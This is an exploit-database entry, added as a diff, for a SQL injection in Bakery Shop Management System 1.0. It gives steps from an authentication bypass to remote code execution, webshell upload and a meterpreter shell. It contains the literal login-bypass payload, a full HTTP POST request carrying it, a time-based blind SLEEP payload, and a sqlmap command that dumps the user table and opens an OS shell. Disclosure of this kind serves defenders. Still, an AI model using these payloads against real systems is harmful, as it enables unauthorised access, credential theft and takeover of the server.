@@ -1,0 +1,84 @@
+id: 37591
+date: 04/07/2022
+title: Bakery Shop Management System 1.0 SQL Injection Vulnerability
+author: Hejap Zairy
+cves: 
+
+# Title: Bakery Shop Management System 1.0 - Blind Time SQLi To Rce
+# Author: Hejap Zairy
+# Vendor: https://www.campcodes.com/projects/php/simple-bakery-shop-management-system/
+# Software: https://www.campcodes.com/wp-content/uploads/2022/02/bsms_0.zip
+# Reference: https://github.com/Matrix07ksa
+# Tested on: Windows, MySQL, Apache
+
+
+# Steps
+# 1.- Go to : https://0day.gov/bsms/login.php
+# 2 - SQLi Authentication Bypass [admin'or 1=1 or ''=']
+# 3 - SQLi To RCE r00t
+# 4 - Ubload webshell 
+# 5 - Web Shell to meterpreter full tty shell
+
+
+#vulnerability Code  php
+
+---
+```
+  <?php
+    $sql = "SELECT p.*,c.name as cname FROM `product_list` p inner join `category_list` c on p.category_id = c.category_id where p.status = 1 and p.delete_flag = 0 order by `name` asc";
+    $qry = $conn->query($sql);
+    while($row = $qry->fetch_assoc()):
+            $stock_in = $conn->query("SELECT sum(quantity) as `total` FROM `stock_list` where unix_timestamp(CONCAT(`expiry_date`, ' 23:59:59')) >= unix_timestamp(CURRENT_TIMESTAMP) and product_id = '{$row['product_id']}' ")->fetch_array()['total'];
+            $stock_out = $conn->query("SELECT sum(quantity) as `total` FROM `transaction_items` where product_id = '{$row['product_id']}' ")->fetch_array()['total'];
+            $stock_in = $stock_in > 0 ? $stock_in : 0;
+            $stock_out = $stock_out > 0 ? $stock_out : 0;
+            $qty = $stock_in-$stock_out;
+            $qty = $qty > 0 ? $qty : 0;
+?>
+```
+---
+#Status: CRITICAL
+[+] Payload POST
+
+---
+POST /bsms/Actions.php?a=login HTTP/1.1
+Host: 0day.gov
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 48
+Origin: http://0day.gov
+Connection: close
+Referer: https://0day.gov/bsms/login.php
+Cookie: PHPSESSID=ttdhr0ntd2dte05a2quob2kr3s
+
+username=admin'or+1%3D1+or+''%3D'&password=hejap
+---
+
+
+
+---
+Parameter: username (POST)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=admin'or 1=1 or ''='' AND (SELECT 1610 FROM (SELECT(SLEEP(515)))eFaV) AND '515'='515&password=hejap
+---
+
+#Blind SQLi Time to Rce
+#ُExploit 
+
+sqlmap -r hejap_0day --dbs --time-sec=10  --threads=10  -D bsms_db  -T user_list  --dump  --eta --technique=t  --os-shell
+
+# Description:
+The  SQLi vulnerability We can use this information to construct an injection attack to bypass authentication.
+
+
+# Proof and Exploit:
+https://i.imgur.com/zR6Mekg.png
+https://i.imgur.com/RQ1JXeK.png
+https://i.imgur.com/0x9gepw.png
+
+#  0day.today [2023-03-24]  #
